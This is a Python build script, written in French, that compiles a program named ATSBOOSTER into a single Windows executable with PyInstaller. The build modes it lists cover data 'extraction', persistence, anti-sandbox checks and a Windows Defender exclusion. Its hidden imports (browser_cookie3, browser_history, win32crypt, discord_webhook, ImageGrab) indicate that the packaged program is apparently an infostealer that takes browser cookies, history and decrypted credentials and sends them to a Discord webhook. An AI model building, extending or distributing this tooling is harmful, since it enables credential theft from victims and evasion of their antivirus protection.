import subprocess
import shutil
import os
import sys

MODES = {
    "1": ("interactive", "Mode interactif (TUI avec menu)"),
    "2": ("--silent", "Mode silencieux (extraction + persistence, sans interface)"),
    "3": ("--boost", "Mode boost (extraction seule, sans persistence)"),
    "4": ("--daily", "Mode daily check (check quotidien anti-sandbox + nouvelles donnees)"),
    "5": ("--all", "Mode all (interactif + persistence + daily check + defender exclusion)"),
}

HIDDEN_IMPORTS = [
    "browser_cookie3", "browser_history", "discord_webhook",
    "Crypto.Cipher.AES", "Crypto.Random",
    "win32crypt", "win32api", "win32con", "winreg",
    "pyautogui", "cpuinfo", "psutil", "getmac", "prettytable",
    "PIL", "PIL.ImageGrab",
]

COLLECT_ALL = ["browser_cookie3", "browser_history", "discord_webhook", "PIL"]


def build():
    print("=== ATSBOOSTER - Build EXE ===\n")

    print("Choisissez le mode d'execution de l'EXE :\n")
    for key, (_, desc) in MODES.items():
        print(f"  [{key}] {desc}")
    print()

    choice = input("Votre choix (1-5) [1]: ").strip() or "1"
    if choice not in MODES:
        print(f"Choix invalide, utilisation du mode interactif par defaut.")
        choice = "1"

    mode_arg, mode_desc = MODES[choice]
    print(f"\nMode selectionne : {mode_desc}\n")

    print("[1/4] Installation des dependances...")
    subprocess.run([sys.executable, "-m", "pip", "install", "-r", "requirements.txt",
                    "pyinstaller", "--quiet"])

    print("\n[2/4] Nettoyage des anciens builds...")
    for d in ["build", "dist", "__pycache__"]:
        if os.path.exists(d):
            shutil.rmtree(d, ignore_errors=True)
    if os.path.exists("ATSBOOSTER.spec"):
        os.remove("ATSBOOSTER.spec")
    for f in os.listdir("."):
        if f.startswith("_entry_") and f.endswith(".py"):
            os.remove(f)

    print("\n[3/4] Creation du point d'entree...")
    entry_file = "_entry_atsbooster.py"
    if mode_arg == "interactive":
        entry_content = "import ATSBOOSTER; ATSBOOSTER.run_tui()\n"
    else:
        entry_content = (
            "import sys\n"
            f"sys.argv = ['ATSBOOSTER.py', '{mode_arg}']\n"
            "import ATSBOOSTER\n"
            "ATSBOOSTER.main_entry()\n"
        )
    with open(entry_file, "w", encoding="utf-8") as f:
        f.write(entry_content)

    print("\n[4/4] Compilation de l' EXE...")
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--name", "ATSBOOSTER",
        "--console",
        "--clean",
        "--noconfirm",
    ]
    for imp in HIDDEN_IMPORTS:
        cmd += ["--hidden-import", imp]
    for pkg in COLLECT_ALL:
        cmd += ["--collect-all", pkg]
    cmd.append(entry_file)

    subprocess.run(cmd)

    try:
        os.remove(entry_file)
    except Exception:
        pass

    exe_path = os.path.join("dist", "ATSBOOSTER.exe")
    if os.path.exists(exe_path):
        shutil.copy2(exe_path, "ATSBOOSTER.exe")
        print(f"\n=== BUILD REUSSI ! ===")
        print(f"Mode : {mode_desc}")
        print(f"EXE : dist/ATSBOOSTER.exe")
        print(f"Copie : ATSBOOSTER.exe")
    else:
        print("\n=== ECHEC DU BUILD ===")


if __name__ == "__main__":
    build()
